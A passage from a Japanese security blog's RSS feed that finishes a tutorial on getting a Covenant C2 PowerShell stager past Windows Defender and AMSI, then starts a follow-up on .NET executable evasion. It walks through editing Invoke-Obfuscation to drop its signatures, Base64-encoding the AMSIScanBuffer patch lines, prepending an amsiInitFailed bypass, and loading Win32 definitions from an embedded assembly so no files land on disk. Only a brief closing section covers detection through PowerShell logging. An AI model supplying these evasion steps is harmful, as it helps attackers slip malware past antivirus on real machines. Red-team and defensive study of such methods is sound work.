&lt;p&gt;ああ、検知されてしまいました。&lt;/p&gt;
&lt;p&gt;例外発生箇所の「&lt;code&gt;$Win32 = @&amp;quot;&lt;/code&gt;」の内容から、ダウンロードしたpre_stager.ps1に含まれるASBBypass のコードで検知されていることがわかります。&lt;/p&gt;
&lt;p&gt;AMSITrigger で検知された文字列を確認します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsitrigger_cloud.png&#34; alt=&#34;amsitrigger_cloud&#34;&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;VirtualProtect&lt;/code&gt; から&lt;code&gt;Marshal::Copy&lt;/code&gt;の範囲で検知され、動的シグネチャ作成が作成されたようです。&lt;br&gt;
通常プログラムでこれらの文字列が含まれるのは滅多にないので、この部分を検知されるのは妥当です。&lt;/p&gt;
&lt;h2 id=&#34;拡大するシグネチャ検知&#34;&gt;拡大するシグネチャ検知&lt;/h2&gt;
&lt;p&gt;VirtualProtect からMarshal::Copyのコードがまとまっているからダメなのでしょうか？それではこれらを別の場所に散らばせてみましょうか・・・？&lt;/p&gt;
&lt;p&gt;変更して、AMSITriggerを再度実行します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsitrigger_bad.png&#34; alt=&#34;amsitrigger_bad&#34;&gt;
&lt;/p&gt;
&lt;p&gt;うわ！大惨事になってしまいました。もともと別の部分は問題なかったのに、散らばせたせいで検知されていなかったものも検知されるようになってしまいました。そう、こういった小手先のテクニックでは動的シグネチャの検知範囲が広がる恐れがあるのです。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;前の記事も記載したように、動的シグネチャの文字列は、一定期間たてば検知対象外に戻る模様です。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;こうなってしまうと、一定期間は作成したほとんどのコードが検知されてしまうので、コードを全て作りなおさないといけません。&lt;/p&gt;
&lt;h2 id=&#34;自動難読化&#34;&gt;自動難読化&lt;/h2&gt;
&lt;p&gt;このようにスクリプトにおけるWindows Defenderのクラウド保護は強烈で、少しでも検知されてしまうと他のコードまで動的シグネチャ作成されてしまいます。&lt;/p&gt;
&lt;p&gt;つまり、我々が手動でコードをちまちま修正したところで、少しでもクラウド保護の気分を害すると、たちまち検知され、コードが使い物にならなくなるのです。&lt;/p&gt;
&lt;p&gt;これを防ぐため、ちまたの攻撃者や Red Teamer は各スクリプトを使い捨て前提で自動で難読化するようにしています。&lt;/p&gt;
&lt;h3 id=&#34;invoke-obfuscation-による難読化と検知&#34;&gt;Invoke-Obfuscation による難読化と検知&lt;/h3&gt;
&lt;p&gt;こういったときに便利なのがPowerShellスクリプトの難読化ツール「Invoke-Obfuscation」です。少し前までは攻撃者や Red Teamer は Invoke-Obfuscation を使っていました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;danielbohannon/Invoke-Obfuscation&#34;&gt;danielbohannon/Invoke-Obfuscation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;しかし残念なことに、本ツールは2019年で更新が停止しており、さらにそのままだとWindows Defenderに容易に検知されるようになってしまいました。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/invoke-obfus_detect.png&#34; alt=&#34;invoke-obfus_detect&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Invoke-Obfuscation で作成した難読化コードが AMSI で検知される様子&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;これは、難読化後コードにInvoke-Obfuscation でよく使われる特徴的な難読化コードが含まれており(&lt;code&gt;$env:ComsEpec ...&lt;/code&gt;)、アンチウイルスソフトが検知しているものです。&lt;/p&gt;
&lt;p&gt;攻撃者たちはこれを避けるため、独自の難読化ツールを作成しています。確かに難読化ツールを自作すれば難読化ツール特有の文字列で検知されることはありません。&lt;/p&gt;
&lt;p&gt;ただし Invoke-Obfuscation の&lt;code&gt;string&lt;/code&gt;機能による難読化は、いくつかの特徴を削除することで、難読化状態の検知を回避することができます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/invoke-obfus_string_filenotdetect.png&#34; alt=&#34;invoke-obfus_string_filenotdetect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;しかし string は 文字列の順序替え・結合に IEX を利用しています。はじめの方に説明したとおり、現在の PowerShell AMSI は IEX に渡される難読化解除後の文字列でもスキャンを行います。そのため静的に検知回避できたとしても、実行時にはアンチウイルスソフトに検知されてしまいます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/invoke-obfus_detect3.png&#34; alt=&#34;invoke-obfus_detect3&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&#34;token-による難読化は&#34;&gt;Token による難読化は？&lt;/h4&gt;
&lt;p&gt;Invoke-Obfuscation の Token 難読化はよりステルスだとされます。しかしこれを使ってpre_stagerを難読化しても、バイパスコードの場合は検知されてしまいます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/invoke-obfus_detect2.png&#34; alt=&#34;invoke-obfus_detect2&#34;&gt;
&lt;/p&gt;
&lt;p&gt;AMSIScanBufferをパッチするバイパスコードは Win32 APIを利用することもあり、難読化しても非常に検知されやすい特徴をもっているのです。（Windows Defender の機械学習エンジンが優秀ということもあります）
これをみてわかるとおり、クラウド保護の PowerShell 用 スキャンエンジンは非常に強固であり、生の PowerShell を用いて メモリパッチするタイプの AMSI バイパスはそのままでは使い物にならないといってよいでしょう。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;amsiinitfailed-を用いた-amsi-バイパスと併用する&#34;&gt;amsiInitFailed を用いた AMSI バイパスと併用する&lt;/h2&gt;
&lt;p&gt;ここでどう検知回避するか、これは Red Teamer でも情報が共有されていないため、調べても正解はありませんでした。&lt;/p&gt;
&lt;p&gt;そこで私は amsiInitFailed タイプの AMSI バイパスと併用する手段を考えました。&lt;/p&gt;
&lt;p&gt;amsiInitFailed タイプのバイパス手法は全てが PowerShell 領域で完結するコードであるため、難読化コードが検知されにくいです。これは amsi.fail で生成されたコードが全く検知されないことからも明らかです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsiinitfailed_notdetect.png&#34; alt=&#34;amsiinitfailed_notdetect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;しかし最初に説明したとおり、amsiInitFailed タイプの AMSI バイパスは Assembly.Load() における AMSI のバイパスはできません。そこで、amsiInitFailed タイプをコードの初めに記載し、 PowerShell 空間での AMSI バイパスを実現します。次に AMSIScanBuffer パッチタイプを次の行に書いて Assembly.Load() を含めた完全なバイパスを行います。&lt;/p&gt;
&lt;p&gt;amsiInitFailed タイプの AMSI バイパスで IEX による難読化解除後の検知がバイパスされるので、 AMSIScanBuffer バイパスコードはダウンロード時の難読化状態のみがスキャンされます。これなら IEX を使った難読化が有効に動作します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsibypass_structure.png&#34; alt=&#34;amsibypass_structure&#34;&gt;
&lt;/p&gt;
&lt;h2 id=&#34;コード変更による検知回避の試み&#34;&gt;コード変更による検知回避の試み&lt;/h2&gt;
&lt;p&gt;今までの説明をもとに、検知回避を試みます。&lt;/p&gt;
&lt;h3 id=&#34;1-invoke-obfuscation-の修正&#34;&gt;1. Invoke-Obfuscation の修正&lt;/h3&gt;
&lt;p&gt;まずは Invoke-Obfuscation の修正です。今回は string 難読化の修正を行うため、&lt;code&gt;Out-ObfuscatedStringCommand.ps1&lt;/code&gt; を変更します。&lt;/p&gt;
&lt;h4 id=&#34;invokeexpressionsyntax&#34;&gt;InvokeExpressionSyntax&lt;/h4&gt;
&lt;p&gt;
  &lt;img src=&#34;images/fix_obfuscatedstringcommand.png&#34; alt=&#34;fix_obfuscatedstringcommand&#34;&gt;
&lt;/p&gt;
&lt;p&gt;881 ~ 886行目の &lt;code&gt;InvokeExpressionSyntax&lt;/code&gt; をコメントアウトします。これは IEX の代替表現ですが、この表現は特徴的であり、Invoke-Obfuscation を使ったことを示すインジケータとなってしまいます。&lt;/p&gt;
&lt;h4 id=&#34;setofsvarsyntax-setofsvarbacksyntax&#34;&gt;SetOfsVarSyntax, SetOfsVarBackSyntax&lt;/h4&gt;
&lt;p&gt;
  &lt;img src=&#34;images/fix_obfuscatedstringcommand2.png&#34; alt=&#34;fix_obfuscatedstringcommand2&#34;&gt;
&lt;/p&gt;
&lt;p&gt;751, 775, 802 行目の JoinOptions をコメントアウトします。このコードも難読化のバリエーションを増やすシンタックスですが、「Variable:OFS」「&amp;lsquo;OFS&amp;rsquo;」という Invoke-Obfuscation 特有の表現が使われています。&lt;/p&gt;
&lt;p&gt;このコードを消すことによって、string 難読化は検知されにくくなります（ただし完全ではない）。&lt;/p&gt;
&lt;h3 id=&#34;2-pre_stagerps1-の修正&#34;&gt;2. pre_stager.ps1 の修正&lt;/h3&gt;
&lt;p&gt;記事の中盤で作成した、AMSIバイパスコードとStagerのダウンロード・実行コードを含むpre_stager.ps1も変更を加えます。&lt;/p&gt;
&lt;h4 id=&#34;2-a-検知されそうなコードのbase64エンコード&#34;&gt;2-a. 検知されそうなコードのBase64エンコード&lt;/h4&gt;
&lt;p&gt;AMSITriggerで確認したように、VirtualProtect から Marshal::Copy までのコードは通常のPowershellコードでは稀であり、string 難読化してもアンチウイルスソフトに検知される可能性があります。&lt;/p&gt;
&lt;p&gt;そのため、この3行は行ごとにBase64 エンコードしておきましょう。はじめにamsiInitFailedでAMSIバイパスを行うことから、 IEX 難読化解除後の文字列はスキャンされないので問題ありません。お好みで XOR 暗号化してもよいです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/base64_sensitive_code.png&#34; alt=&#34;base64_sensitive_code&#34;&gt;
&lt;/p&gt;
&lt;h4 id=&#34;2-b-string-難読化&#34;&gt;2-b. string 難読化&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;Out-ObfuscatedStringCommand&lt;/code&gt; を用いて pre_stager.ps1 を難読化します。出力ファイルは「pre_stager_enc.ps1」とします。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-Obfuscation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;psd1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-ObfuscatedStringCommand&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pre_stager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pre_stager_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-c-amsiinitfailed-コードの追加&#34;&gt;2-c. amsiInitFailed コードの追加&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://amsi.fail/&#34;&gt;amsi.fail&lt;/a&gt; にて難読化された amsiInitFailed バイパスコードを生成し、 pre_stager_enc.ps1 の1行目に追加します。&lt;/p&gt;
&lt;h4 id=&#34;2-d-amsitrigger-で検知テスト&#34;&gt;2-d. AMSITrigger で検知テスト&lt;/h4&gt;
&lt;p&gt;リアルタイムスキャン、クラウド保護をオンにして、 AMSITrigger で pre_stager_enc.ps1 を検知テストします。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsitrigger_cloud_ok.png&#34; alt=&#34;amsitrigger_cloud_ok&#34;&gt;
&lt;/p&gt;
&lt;p&gt;クラウド保護が検知しなければ、1行目の amsiInitFailed バイパスで 2行目以降の IEX は検知しないため問題ないとわかります。&lt;/p&gt;
&lt;p&gt;もし検知された場合は Out-ObfuscatedStringCommand の難読化で検知されたと思われるため、ステップ2-b からやり直してください。&lt;/p&gt;
&lt;h2 id=&#34;実行-1&#34;&gt;実行&lt;/h2&gt;
&lt;p&gt;検知テストが済んだ pre_stager_enc.ps1 を再度 Covenant の Listener にアップロードします。そして記事の中盤でやったものと同じように、pre_stager.ps1 をダウンロードし実行するコマンドラインを作成します。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;コマンドラインの生成方法は覚えていますか？わからない場合は記事を読み直してください！&lt;br&gt;
※ファイルパスは「/pre_stager.ps1」にしておくと、中盤で作成したコマンドライン引数を変える必要がないので楽です。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;準備ができたら実行しましょう。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/win_with_cloud.png&#34; alt=&#34;win_with_cloud&#34;&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;検知回避に成功しました！&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;adv-さらなるステルス化の試み-add-type未使用&#34;&gt;Adv: さらなるステルス化の試み (Add-Type未使用)&lt;/h2&gt;
&lt;p&gt;ここまででもWindows Defenderの検知を回避することができますが、ステルスのためにまだやれることがあります。&lt;/p&gt;
&lt;h3 id=&#34;add-type-による-cs-ファイル生成に注意&#34;&gt;Add-Type による cs ファイル生成に注意&lt;/h3&gt;
&lt;p&gt;ASBBypass は PowerShell 内で C# コードを作成し、 Add-Type コマンドレットによって C# コードをコンパイル・実行して Win32 API を呼び出していました。しかしながらこれを用いるとステルス性に問題が発生します。&lt;/p&gt;
&lt;p&gt;Add-Type を使うと C# コードの場合、PC 内部でコードのコンパイルが行われます。そのときコンパイル対象の C# コードは実行ユーザの Temp フォルダに保存されてしまうのです。

  &lt;img src=&#34;images/add-type_file.png&#34; alt=&#34;add-type_file&#34;&gt;
&lt;/p&gt;
&lt;p&gt;これでは完全なファイルレスとは呼べません。csファイル作成を避けるには Add-Type を使わない方法を考える必要があります。そこで Powershell 内で Add-Type を使わず Win32 API を使う方法として、  .NET アセンブリを ps1 ファイルに内蔵し、Assembly.Load() で読み込む方法があります。&lt;/p&gt;
&lt;h3 id=&#34;win32api-定義だけをアセンブリ化する&#34;&gt;Win32API 定義だけをアセンブリ化する&lt;/h3&gt;
&lt;p&gt;ネット上に記載されている &lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#amsi-buffer-patch---in-memory&#34;&gt;AMSIBufferBypass のインメモリパッチ手法&lt;/a&gt;は、全てのバイパスコードを cs で作成しアセンブリ化し、Load しています。しかしその手法だと Assembly.Load() の際、AMSI を通したアンチウイルスソフトとの検知回避バトルが発生します。&lt;/p&gt;
&lt;p&gt;それを避けるため、私は Win32 API 定義だけをアセンブリ化することにしました。こうすることによって、Win32 API 定義だけでは不審ではないので検知されず、また ASBBypass のパッチコードは amsiInitFailed バイパス + string 難読化によって検知されません。&lt;/p&gt;
&lt;h4 id=&#34;win32-クラスアセンブリの作成&#34;&gt;Win32 クラスアセンブリの作成&lt;/h4&gt;
&lt;p&gt;まずは ASBBypass に含まれる Win32 クラス定義の部分を win32.cs として保存します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/win32_cs.png&#34; alt=&#34;win32_cs&#34;&gt;
&lt;/p&gt;
&lt;p&gt;次に csc.exe で csファイルをコンパイルし、win32.dll を作成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Framework64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;30319&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;csc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-target&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;library&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;win32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dll ファイルを Base64 化し、クリップボードにコピーします。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;win32.dll&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[Convert]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ToBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;[IO.File]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;これを Assembly.Load で正常に読み込まれるかチェックをしましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$dat&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;TVqQAAMAAA(..snip..)AAAAAAAAAAAAAAAAAAAAAAAA=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[Reflection.Assembly]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Load&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;[Convert]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FromBase64String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$dat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;GAC&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Version&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Location&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;---&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;-------&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;False&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;30319&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[Win32]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;IsPublic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IsSerial&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;                                     &lt;span class=&#34;n&#34;&gt;BaseType&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;                                     &lt;span class=&#34;p&#34;&gt;--------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;True&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;False&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Win32&lt;/span&gt;                                    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;正常に読み込まれることを確認したので、pre_stager.ps1 の該当箇所を置き換えます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/win32_assembly.png&#34; alt=&#34;win32_assembly&#34;&gt;
&lt;/p&gt;
&lt;p&gt;これで完成です。&lt;/p&gt;
&lt;h3 id=&#34;実行-2&#34;&gt;実行&lt;/h3&gt;
&lt;p&gt;実際にコードを実行し、cs ファイルが生成されないことを確認しましょう。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/fileless_completely.png&#34; alt=&#34;fileless_completely&#34;&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;勝利です！&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;今回は Covenant Stager の PowerShell ランチャーを例にして Windows Defender のスクリプト検知回避および AMSI バイパスについて学びました。また応用編として、Add-Type のクラス定義を .NET アセンブリ化して読み込むファイルレス化手法についても触れました。&lt;/p&gt;
&lt;p&gt;実際の Red Teaming では直接 ps1 ファイルをターゲット環境に置いて実行させることはなく、initial access には Office マクロファイルを使うようです（よくわかりませんが）。ただ Office VBAで powershell プロセスを実行させることを容認するのであれば、VBA 上で Powershell のコマンドラインに今回作成したものを用いることですぐに Red Teaming に利用できます。&lt;/p&gt;
&lt;p&gt;またOffice VBAやVBScriptなどの検知回避に用いられるGadgetToJScriptの原理とチュートリアルについては、以前私が記事を作成しました。お時間があればこちらもご覧ください。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/&#34;&gt;GadgetToJScript を利用した Office VBA のAMSI バイパスと原理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;検知&#34;&gt;検知&lt;/h2&gt;
&lt;p&gt;Windows Defenderの検知回避ができたとはいえ、PowerShellの悪用は複数の観点で検出が可能です。&lt;/p&gt;
&lt;p&gt;一番検出しやすいのは Windows イベントログでしょうか。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/PowerShellLogging.jpeg&#34; alt=&#34;PowerShellLogging&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/&#34;&gt;https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;スクリプトのログは予めグループポリシーでモジュールログの有効設定が必要なことと、どのような文字列を不審と判断させるかなど、複数のハードルがありますが、特にログ記録の回避をしていない本記事に対する対抗策としては有効と考えられます。&lt;/p&gt;
&lt;h3 id=&#34;その他&#34;&gt;その他&lt;/h3&gt;
&lt;p&gt;本記事も前回と同様、2020年10月に作成したものです。&lt;br&gt;
内容が多かったのでやっぱり同人誌にしておけばよかったかな・・・。&lt;/p&gt;
&lt;p&gt;以上。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>検知回避の手法 - PowerShell</title>
        <link>https://www.shutingrz.com/post/avoid-detection-powershell/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>検知回避の手法 - 実行ファイル</title>
      <link>https://www.shutingrz.com/post/avoid-detection-dotnet/</link>
      <pubDate>Thu, 08 Apr 2021 00:00:07 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/avoid-detection-dotnet/</guid>
      <description>&lt;p&gt;しゅーとです。今回は実行ファイル、特に.NETプログラムの検知回避に関する記事です。&lt;/p&gt;
&lt;p&gt;ペネトレーションテストに携わりたい方だけではなく、Blue Teamの方もアンチウイルスソフト単体の限界を知る意味で有用と思います。&lt;/p&gt;
&lt;p&gt;.NETプログラムの例として、セットアップが簡単なC2フレームワークである、&lt;a href=&#34;https://github.com/cobbr/Covenant&#34;&gt;Covenant&lt;/a&gt; の検知回避をゴールに説明します。&lt;/p&gt;
&lt;p&gt;エージェントであるCovenant Gruntは.NETプログラムですが、OSSであるためにアンチウイルスベンダーに検証・解析されシグネチャが作成されています。&lt;/p&gt;
&lt;p&gt;またCovenantはStagerとして様々なLauncherが用意されており、その中に実行ファイルであるBinary Launcherが存在します。ただこのバイナリは必ずアンチウイルスソフトによって検知されます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/raw_binary_def.png&#34; alt=&#34;raw_binary_def&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
